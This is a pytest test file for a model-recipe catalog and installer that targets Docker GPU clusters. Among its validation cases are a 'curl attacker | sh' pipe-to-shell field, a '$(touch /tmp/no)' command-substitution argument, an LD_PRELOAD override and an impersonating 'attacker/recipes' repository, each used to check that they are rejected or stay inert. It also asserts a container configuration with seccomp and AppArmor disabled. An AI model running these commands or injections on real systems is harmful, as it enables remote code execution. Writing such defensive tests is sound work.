import base64
import copy
import hashlib
import json
from types import SimpleNamespace
from unittest.mock import AsyncMock

import httpx
import pytest
from pydantic import ValidationError

from spark_cluster.app import create_app
from spark_cluster.cluster_registry import ClusterTarget, GPUDevice
from spark_cluster.config import Settings
from spark_cluster.local_docker import DockerEngineClient
from spark_cluster.recipe_install import RecipeInstaller
from spark_cluster.recipes import RecipeCatalog, SparkRecipe, bundled_recipes, version_tuple
from spark_cluster.runtime_catalog import RuntimeRegistry
from spark_cluster.runtime_engines import build_execution_plan
from spark_cluster.store import SnapshotStore


@pytest.fixture
def env(tmp_path):
    settings = Settings(
        database_path=tmp_path / "state.db",
        setup_state_path=tmp_path / "setup",
        model_cache_path=tmp_path / "models",
        model_admin_token="test-admin",
    )
    store = SnapshotStore(settings.database_path)
    return settings, store, RecipeCatalog(settings, store)


def starter():
    return next(r for r in bundled_recipes() if "qwen38" in r.id)


def target():
    return ClusterTarget(
        id="spark",
        name="Spark",
        kind="local-docker",
        hardware="dgx-spark",
        host_address="127.0.0.1",
        gpu_count=1,
        gpu_memory_gib=120,
        gpus=[GPUDevice(index=0, name="GB10", uuid="GPU-one", memory_gib=120)],
    )


def test_shipped_recipes_have_real_pins_and_strict_contract():
    recipes = bundled_recipes()
    assert len(recipes) >= 2
    for recipe in recipes:
        assert len(recipe.model.revision) == 40
        assert "@sha256:" in recipe.runtime.image
        assert recipe.validation == "source-reviewed"
        assert recipe.launch_request().recipe_revision == recipe.model.revision
        assert recipe.launch_request().recipe_runtime.image == recipe.runtime.image
    assert version_tuple("1.10.0") > version_tuple("1.9.0")
    for change in [
        {"schema_version": "spark-cluster.recipe/v2"},
        {"version": "latest"},
        {"version": "01.0.0"},
        {"execute": "curl attacker | sh"},
        {"model": {**starter().model.model_dump(), "revision": "main"}},
        {"runtime": {**starter().runtime.model_dump(), "image": "eugr/image:latest"}},
        {"runtime": {**starter().runtime.model_dump(), "arguments": ["--port=8080"]}},
        {"runtime": {**starter().runtime.model_dump(), "environment": {"LD_PRELOAD": "x"}}},
        {"launch": {**starter().launch.model_dump(), "unknown_flag": True}},
        {"requirements": {**starter().requirements.model_dump(), "nodes": 2}},
    ]:
        with pytest.raises(ValidationError):
            SparkRecipe.model_validate({**starter().model_dump(), **change})


@pytest.mark.asyncio
async def test_release_immutability_numeric_history_and_restart(env):
    settings, store, catalog = env
    first = starter()
    value = await catalog.remember(first, {"kind": "imported"})
    changed = first.model_copy(update={"description": "Changed content"})
    with pytest.raises(ValueError, match="Immutable"):
        await catalog.remember(changed, {"kind": "imported"})
    newer = first.model_copy(update={"version": "1.10.0"})
    await catalog.remember(newer, {"kind": "imported"})
    await catalog.remember(first.model_copy(update={"version": "1.9.0"}), {"kind": "imported"})
    reopened = RecipeCatalog(settings, store)
    entries = [e for e in await reopened.entries() if e["recipe"]["id"] == first.id]
    assert [e["recipe"]["version"] for e in entries] == ["1.10.0", "1.9.0", "1.0.0"]
    assert (await reopened.get(value["id"]))["recipe"] == first.model_dump(mode="json")


@pytest.mark.asyncio
async def test_github_discovery_pins_commit_caches_etags_and_survives_outage(env):
    settings, store, _ = env
    recipe = starter().model_copy(update={"id": "publisher/qwen", "version": "1.0.0"})
    calls = []
    fail = False
    sha = "a" * 40

    def content(value):
        raw = json.dumps(value).encode()
        return {"type": "file", "size": len(raw), "content": base64.b64encode(raw).decode()}

    def handler(request):
        calls.append(request)
        if fail:
            return httpx.Response(403, json={"message": "rate limited"})
        if request.headers.get("if-none-match"):
            return httpx.Response(304)
        path = request.url.path
        if path == "/search/repositories":
            body = {"items": [{"full_name": "publisher/recipes"}]}
        elif path.endswith("/commits/HEAD"):
            body = {"sha": sha}
        elif path.endswith("/spark-cluster-recipes.json"):
            assert request.url.params["ref"] == sha
            body = content(
                {
                    "schema_version": "spark-cluster.recipe-index/v1",
                    "recipes": ["recipes/qwen.spark-recipe.json"],
                }
            )
        else:
            assert request.url.params["ref"] == sha
            body = content(recipe.model_dump(mode="json"))
        return httpx.Response(200, json=body, headers={"ETag": '"same"'})

    catalog = RecipeCatalog(settings, store, transport=httpx.MockTransport(handler))
    result = await catalog.discover()
    assert result["found"] == 1 and not result["errors"]
    entry = await catalog.get(recipe.content_hash)
    assert entry["origin"]["commit"] == sha
    previous = len(calls)
    await RecipeCatalog(settings, store, transport=httpx.MockTransport(handler)).discover()
    assert len(calls) == previous  # persisted one-hour cache, not just an in-process cache
    await catalog.discover(force=True)
    assert any(r.headers.get("if-none-match") == '"same"' for r in calls)
    fail = True
    assert (await catalog.discover(force=True))["stale"]
    assert (await catalog.get(recipe.content_hash))["recipe"]["version"] == "1.0.0"


@pytest.mark.asyncio
async def test_discovery_rejects_publisher_impersonation(env):
    settings, store, _ = env
    recipe = starter().model_dump(mode="json")

    def handler(request):
        if request.url.path == "/search/repositories":
            return httpx.Response(200, json={"items": [{"full_name": "attacker/recipes"}]})
        if request.url.path.endswith("/commits/HEAD"):
            return httpx.Response(200, json={"sha": "a" * 40})
        payload = (
            {
                "schema_version": "spark-cluster.recipe-index/v1",
                "recipes": ["qwen.spark-recipe.json"],
            }
            if request.url.path.endswith("/spark-cluster-recipes.json")
            else recipe
        )
        raw = json.dumps(payload).encode()
        return httpx.Response(
            200, json={"type": "file", "size": len(raw), "content": base64.b64encode(raw).decode()}
        )

    catalog = RecipeCatalog(settings, store, transport=httpx.MockTransport(handler))
    result = await catalog.discover()
    assert result["found"] == 0 and result["errors"]
    assert not store.runtime_objects("recipe")


def test_recipe_flags_reach_real_docker_payload_as_literal_argv(env):
    settings, _, _ = env
    recipe = starter()
    # A metacharacter-containing value remains a single argv item, never shell source.
    runtime = recipe.runtime.model_copy(
        update={"arguments": ["--chat-template", "$(touch /tmp/no)"]}
    )
    path = settings.model_cache_path / "qwen"
    path.mkdir(parents=True)
    docker = DockerEngineClient(settings)
    launch = recipe.launch_request()
    plan = build_execution_plan(launch, str(path), settings, cluster_kind="local-docker")
    assert plan.image == recipe.runtime.image
    payload = docker.runtime_payload(
        cluster=target(),
        image=plan.image,
        model_path=str(path),
        served_model_name="qwen",
        context_length=32768,
        tensor_parallel=1,
        pipeline_parallel=1,
        gpu_memory_utilization=0.8,
        kv_cache_dtype="fp8_e4m3",
        max_num_seqs=1,
        max_num_batched_tokens=4096,
        expert_parallel=False,
        chunked_prefill=True,
        recipe_runtime=runtime,
        recipe_revision=recipe.model.revision,
    )
    assert payload["Entrypoint"] == ["vllm", "serve"]
    assert payload["Labels"]["spark-cluster.preserve-launch-settings"] == "true"
    assert payload["Cmd"][-1] == "$(touch /tmp/no)"
    assert payload["Cmd"][payload["Cmd"].index("--revision") + 1] == recipe.model.revision
    assert payload["HostConfig"]["SecurityOpt"] == ["seccomp=unconfined", "apparmor=unconfined"]
    assert any(bind.endswith(":/root/.cache") for bind in payload["HostConfig"]["Binds"])
    assert "VLLM_PLE_TABLE_MEMORY=disk" in payload["Env"]


@pytest.mark.asyncio
async def test_registry_resolves_pinned_custom_recipe_image_and_checks_architecture():
    config = json.dumps({"os": "linux", "architecture": "arm64"}).encode()
    config_digest = "sha256:" + hashlib.sha256(config).hexdigest()
    manifest = json.dumps({"config": {"digest": config_digest}, "layers": [{"size": 12}]}).encode()
    digest = "sha256:" + hashlib.sha256(manifest).hexdigest()

    def handler(request):
        assert request.url.host == "registry-1.docker.io"
        assert "/eugr/test/" in request.url.path
        return httpx.Response(200, content=config if "/blobs/" in request.url.path else manifest)

    remote = RuntimeRegistry(httpx.MockTransport(handler))
    resolved = await remote.resolve_image("vllm", "docker.io/eugr/test@" + digest, "linux/arm64")
    assert resolved["digest"] == digest and resolved["config_digest"] == config_digest
    assert resolved["image"] == "docker.io/eugr/test@" + digest
    with pytest.raises(ValueError):
        await remote.resolve_image("vllm", "http://localhost/image:latest", "linux/arm64")


@pytest.mark.asyncio
async def test_install_runs_exact_release_and_requires_generated_response(env):
    _, store, catalog = env
    recipe = starter()
    await catalog.entries()
    pool = SimpleNamespace(
        inventory=AsyncMock(return_value={"clusters": [{"id": "spark", "available": True}]}),
        jobs=[{"id": "load", "status": "ready"}],
        enqueue=AsyncMock(return_value={"id": "load"}),
    )
    registry = SimpleNamespace(get=lambda _: target())
    library = SimpleNamespace(
        remote=SimpleNamespace(resolve_image=AsyncMock(return_value={})),
        ensure_local_image=AsyncMock(),
    )
    download = AsyncMock(return_value=SimpleNamespace(id="weights"))
    store.get_download = lambda _: SimpleNamespace(status="completed", progress=100)
    verify = AsyncMock()
    installer = RecipeInstaller(catalog, registry, store, library, pool, download, verify, str)
    job = await installer.create(recipe.content_hash, "spark")
    await installer.tasks[job["id"]]
    saved = (await installer.jobs())[0]
    assert saved["status"] == "completed" and saved["stage"] == "ready"
    assert saved["recipe"]["model"]["revision"] == recipe.model.revision
    request = pool.enqueue.call_args.args[0]
    assert request.cluster_id == "spark"
    assert request.settings.recipe_runtime.image == recipe.runtime.image
    assert download.call_args.args[0].revision == recipe.model.revision
    verify.assert_awaited_once()
    # A failed response check must never be called completed, even if the runtime started.
    verify.side_effect = ValueError("No generated text")
    job = await installer.create(recipe.content_hash, "spark")
    await installer.tasks[job["id"]]
    assert (await installer.jobs())[0]["status"] == "failed"
    assert (await installer.jobs())[0]["error"] == "No generated text"
    # Completed and failed installs preserve their independent lock snapshots.
    assert len(await installer.jobs()) == 2


@pytest.mark.asyncio
async def test_install_blocks_running_models_and_marks_interrupted_jobs(env):
    _, store, catalog = env
    await catalog.entries()
    pool = SimpleNamespace(
        inventory=AsyncMock(
            return_value={
                "clusters": [
                    {"id": "spark", "available": True, "resident_models": [{"model_id": "other"}]}
                ]
            }
        )
    )
    library = SimpleNamespace(remote=SimpleNamespace(resolve_image=AsyncMock()))
    installer = RecipeInstaller(
        catalog,
        SimpleNamespace(get=lambda _: target()),
        store,
        library,
        pool,
        AsyncMock(),
        AsyncMock(),
        str,
    )
    job = await installer.create(starter().content_hash, "spark")
    await installer.tasks[job["id"]]
    assert (await installer.jobs())[0]["status"] == "failed"
    library.remote.resolve_image.assert_not_awaited()
    store.save_runtime_object("recipe-install", {**job, "id": "interrupted", "status": "running"})
    await installer.start()
    assert all(j["status"] == "failed" for j in await installer.jobs())


@pytest.mark.asyncio
async def test_recipe_api_auth_import_schema_and_incompatible_target(env):
    settings, _, _ = env
    app = create_app(settings)
    app.state.recipe_catalog.start = lambda: None  # isolate API contract from internet
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app), base_url="http://test"
    ) as client:
        assert (
            await client.post("/api/v1/recipes/import", json=starter().model_dump(mode="json"))
        ).status_code == 401
        headers = {"Authorization": "Bearer test-admin"}
        response = await client.get("/api/v1/recipes/schema", headers=headers)
        assert response.status_code == 200
        assert response.json()["properties"]["schema_version"]["const"] == "spark-cluster.recipe/v1"
        response = await client.post(
            "/api/v1/recipes/import", headers=headers, json=starter().model_dump(mode="json")
        )
        assert response.status_code == 200
        value = copy.deepcopy(starter().model_dump(mode="json"))
        value["description"] = "Changed published release"
        assert (
            await client.post("/api/v1/recipes/import", headers=headers, json=value)
        ).status_code == 409
        response = await client.post(
            "/api/v1/recipes/install",
            headers=headers,
            json={"recipe_hash": starter().content_hash, "cluster_id": "missing"},
        )
        assert response.status_code == 404
        listing = (await client.get("/api/v1/recipes", headers=headers)).json()
        assert len(listing["recipes"]) >= 2
        assert all(entry["blockers"] for entry in listing["recipes"])


@pytest.mark.asyncio
async def test_recipe_upgrade_reuses_managed_weights_without_download(env):
    _, store, catalog = env
    await catalog.entries()
    pool = SimpleNamespace(
        inventory=AsyncMock(return_value={"clusters": [{"id": "spark", "available": True}]}),
        jobs=[{"id": "load", "status": "ready"}],
        enqueue=AsyncMock(return_value={"id": "load"}),
    )
    library = SimpleNamespace(
        remote=SimpleNamespace(resolve_image=AsyncMock(return_value={})),
        ensure_local_image=AsyncMock(),
    )
    installer = RecipeInstaller(
        catalog,
        SimpleNamespace(get=lambda _: target()),
        store,
        library,
        pool,
        AsyncMock(return_value=None),
        AsyncMock(),
        str,
    )
    job = await installer.create(starter().content_hash, "spark")
    await installer.tasks[job["id"]]
    assert (await installer.jobs())[0]["status"] == "completed"
    assert (await installer.jobs())[0]["download_job_id"] is None
    pool.enqueue.assert_awaited_once()


def test_local_gpu_inventory_recognizes_gb10_for_recipe_admission(env):
    from spark_cluster.cluster_registry import ClusterRegistry

    settings, _, _ = env
    registry = ClusterRegistry(settings)
    spark = registry.add_local(
        name="Spark",
        host_address="127.0.0.1",
        runtime_port=30000,
        gpus=target().gpus,
        model_storage_path=str(settings.model_cache_path),
    )
    assert spark.hardware == "dgx-spark"
    assert ClusterRegistry(settings).get(spark.id).hardware == "dgx-spark"
    generic = registry.add_local(
        name="Generic",
        host_address="127.0.0.1",
        runtime_port=30000,
        gpus=[GPUDevice(index=0, name="NVIDIA RTX 5090", uuid="GPU-other", memory_gib=32)],
        model_storage_path=str(settings.model_cache_path),
    )
    assert generic.hardware == "nvidia-gpu"


@pytest.mark.asyncio
async def test_install_only_preserves_resident_and_replay(env):
    _, store, catalog = env
    await catalog.entries()
    pool = SimpleNamespace(
        inventory=AsyncMock(return_value={"clusters": [{"id": "spark", "available": True,
            "resident_models": [{"model_id": "qwen"}]}]}),
        enqueue=AsyncMock(),
    )
    library = SimpleNamespace(remote=SimpleNamespace(resolve_image=AsyncMock(return_value={})),
        ensure_local_image=AsyncMock())
    verify = AsyncMock()
    installer = RecipeInstaller(catalog, SimpleNamespace(get=lambda _: target()), store,
        library, pool, AsyncMock(return_value=None), verify, str)
    job = await installer.create(starter().content_hash, "spark", launch=False, request_id="a" * 32)
    await installer.tasks[job["id"]]
    assert job["status"] == "completed" and job["stage"] == "installed"
    assert job["inference_verified"] is False
    pool.enqueue.assert_not_awaited()
    verify.assert_not_awaited()
    assert (await installer.create(starter().content_hash, "spark", launch=False,
        request_id="a" * 32))["id"] == job["id"]
    with pytest.raises(ValueError, match="Idempotency"):
        await installer.create(starter().content_hash, "spark", launch=True, request_id="a" * 32)


def test_node_recipe_hash_rejects_changed_release():
    from spark_cluster.recipe_api import NodeRecipeRequest
    with pytest.raises(ValidationError, match="immutable"):
        NodeRecipeRequest(recipe=starter(), recipe_hash="0" * 64)


@pytest.mark.asyncio
async def test_remote_recipe_signed_delegation_and_storage_mapping(env):
    from spark_cluster.remote_cluster import valid_controller_signature
    from spark_cluster.remote_recipes import RemoteRecipes
    from spark_cluster.storage import StorageShortage
    settings, _, _ = env
    remote = target().model_copy(update={"kind": "remote-bridge", "endpoint": "http://node"})
    def handle(request):
        assert valid_controller_signature(settings.model_admin_token, request.method,
            request.url.path, request.headers.get("x-spark-timestamp"),
            request.headers.get("x-spark-signature"), request.content)
        body = json.loads(request.content)
        assert body["recipe_hash"] == starter().content_hash
        assert body["launch"] is False
        return httpx.Response(507, json={"detail": {"storage": {"requirements": [
            {"location_id": "local-node:models", "missing_bytes": 123}]}}})
    bridge = RemoteRecipes(settings, None, httpx.MockTransport(handle))
    with pytest.raises(StorageShortage) as error:
        await bridge.prepare(remote, starter(), launch=False)
    assert error.value.storage["requirements"][0]["location_id"] == "spark:models"


def test_gb10_uses_measured_system_memory_only(monkeypatch):
    import sys
    from spark_cluster import local_docker
    nvml = SimpleNamespace(nvmlInit=lambda: None, nvmlShutdown=lambda: None,
        nvmlDeviceGetCount=lambda: 1, nvmlDeviceGetHandleByIndex=lambda _: 0,
        nvmlDeviceGetCudaComputeCapability=lambda _: (12, 1),
        nvmlDeviceGetName=lambda _: "NVIDIA GB10", nvmlDeviceGetUUID=lambda _: "GPU-spark",
        NVMLError=RuntimeError)
    monkeypatch.setitem(sys.modules, "pynvml", nvml)
    monkeypatch.setattr(local_docker, "unified_memory_stats", lambda: {"total_gib": 121.63, "used_gib": 100})
    gpu = local_docker.detect_nvidia_gpus()[0]
    assert gpu.unified_memory and gpu.memory_gib == 121.63
    monkeypatch.setattr(local_docker, "unified_memory_stats", lambda: None)
    assert local_docker.detect_nvidia_gpus() == []
    nvml.nvmlDeviceGetName = lambda _: "RTX 4090"
    nvml.nvmlDeviceGetMemoryInfo = lambda _: (_ for _ in ()).throw(RuntimeError())
    assert local_docker.detect_nvidia_gpus() == []
